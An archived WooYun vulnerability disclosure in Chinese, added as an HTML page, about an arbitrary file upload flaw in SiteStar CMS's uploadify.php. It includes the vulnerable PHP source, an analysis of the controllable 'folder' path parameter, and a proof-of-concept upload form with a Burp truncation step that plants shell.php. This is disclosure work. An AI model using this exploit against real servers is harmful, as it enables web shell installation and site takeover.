@@ -1,0 +1,258 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		建站之星任意文件上传漏洞(续一)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		建站之星任意文件上传漏洞(续一)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/felixk3y">felixk3y</a> 
+</li><li>提交时间：		2014-01-13 15:47</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-17：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-03：	细节向普通白帽子公开<br/>
+									2014-02-23：	细节向实习白帽子公开<br/>
+									2014-04-13：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">本月8号就发了个同样的上传漏洞<br />
+http://www.wooyun.org/bugs/wooyun-2010-048293<br />
+迟迟不给确认,好吧 那我就只有用这种方式催催...<br />
+Tips:如果再不及时确认,就公布续集二...</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">#1 漏洞挖掘<br />
+<br />
+漏洞出现在<br />
+<br />
+/script/multiupload/uploadify.php 51行---<br />
+<br />
+</p><pre><code>if (!empty($_FILES) &amp;&amp; in_array($file_ext,$ext_arr)) {<br />
+	//echo &#039;2222&#039;;<br />
+	$tempFile = $_FILES[&#039;Filedata&#039;][&#039;tmp_name&#039;];<br />
+	$targetPath = $_SERVER[&#039;DOCUMENT_ROOT&#039;] . $path . &#039;/&#039;;<br />
+	//echo $targetPath;<br />
+	$imgfile =  str_replace(&#039;//&#039;,&#039;/&#039;,$targetPath) . $_FILES[&#039;Filedata&#039;][&#039;name&#039;];<br />
+	// 解决Windows中文文件名乱码<br />
+	if (preg_match(&quot;/^WIN/i&quot;, PHP_OS)) {<br />
+		$imgfile = iconv(&#039;UTF-8&#039;, &#039;GBK&#039;, $imgfile);<br />
+	}<br />
+<br />
+	move_uploaded_file($tempFile, $imgfile);<br />
+	ParamParser::fire_virus($imgfile);<br />
+<br />
+	function img_restruck($imgfile_name,$root, $path = &#039;upload/image/&#039;) {<br />
+		define(&#039;SSFCK&#039;, 1);<br />
+		define(&#039;SSROOT&#039;, $root);<br />
+		include_once($root.&#039;/library/image.func.php&#039;);<br />
+<br />
+		$fullfilename = SSROOT.&quot;/$path&quot;.$imgfile_name;<br />
+<br />
+		WaterImg($fullfilename, &#039;up&#039;);<br />
+    }<br />
+<br />
+	if($WATERMARK_STATUS) img_restruck($_FILES[&#039;Filedata&#039;][&#039;name&#039;],$root);<br />
+	echo &quot;1&quot;;<br />
+}</code></pre><p class='detail'><br />
+<br />
+#2 漏洞分析<br />
+<br />
+往往出现文件上传漏洞,不是文件名可控,就是路径可控(低级的文件上传不包括在内)<br />
+<br />
+看看文件名是否可控<br />
+<br />
+搜索move_uploaded_file函数,往前看...<br />
+<br />
+</p><pre><code>move_uploaded_file($tempFile, $imgfile);</code></pre><p class='detail'><br />
+<br />
+跟上$imgfile<br />
+<br />
+</p><pre><code>$imgfile =  str_replace(&#039;//&#039;,&#039;/&#039;,$targetPath) . $_FILES[&#039;Filedata&#039;][&#039;name&#039;];</code></pre><p class='detail'><br />
+<br />
+$_FILES[&#039;Filedata&#039;][&#039;name&#039;]貌似我们可以控制,继续...<br />
+<br />
+</p><pre><code>$_FILES[&#039;Filedata&#039;][&#039;name&#039;] = date(&quot;YmdHis&quot;) . &#039;_&#039; . rand(10, 99) . &#039;.&#039; . $file_ext;</code></pre><p class='detail'><br />
+<br />
+看见了吧,原来我们不可控.好吧 那我们继续看另一个：路径是否可控<br />
+<br />
+</p><pre><code>$imgfile =  str_replace(&#039;//&#039;,&#039;/&#039;,$targetPath) . $_FILES[&#039;Filedata&#039;][&#039;name&#039;];</code></pre><p class='detail'><br />
+<br />
+跟下$targetPath<br />
+<br />
+</p><pre><code>$targetPath = $_SERVER[&#039;DOCUMENT_ROOT&#039;] . $path . &#039;/&#039;;</code></pre><p class='detail'><br />
+<br />
+看看 $path 怎么来的，本文件第14行：<br />
+<br />
+</p><pre><code>list($path, $target) = explode(&quot;|&quot;, $_POST[&#039;folder&#039;]);</code></pre><p class='detail'><br />
+<br />
+看见了吧? $_POST[&#039;folder&#039;] 是我们完全可以控制的<br />
+<br />
+呵呵 ,看吧 漏洞挖掘原来如此简单...<br />
+<br />
+(其实一点儿也不简单 :-))<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">#3 漏洞利用<br />
+<br />
+将如下代码保存为Upload.htm<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;frmUpload&quot; action=&quot;http://127.0.0.1/sitestar/script/multiupload/uploadify.php?&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;<br />
+  &lt;input type=&quot;file&quot; name=&quot;Filedata&quot; id=&quot;Filedata&quot;&gt;<br />
+  &lt;input name=&quot;folder&quot; type=&quot;hidden&quot; value=&quot;/shell.php.jpg|shell.jpg&quot;&gt;<br />
+  &lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;<br />
+&lt;/form&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+访问Upload.htm,采用Burpsuite抓包截断<br />
+<br />
+</p><p class="detail"><a href="../images/1315194103ef74319b0ad3eafaf64c1baf46f0bd.jpg" target="_blank"><img src="../images/1315194103ef74319b0ad3eafaf64c1baf46f0bd.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+点击Forward，就可在根目录下生成shell.php<br />
+<br />
+</p><p class="detail"><a href="../images/131522178e671f4550a2258245967414efebbd79.jpg" target="_blank"><img src="../images/131522178e671f4550a2258245967414efebbd79.jpg" alt="0.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们懂,如有疑问 可以联系我。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/felixk3y" title="felixk3y">felixk3y</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048760" title="建站之星任意文件上传漏洞(续一)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-01-14 10:59</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">漏洞已经发补丁包，感谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48760";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
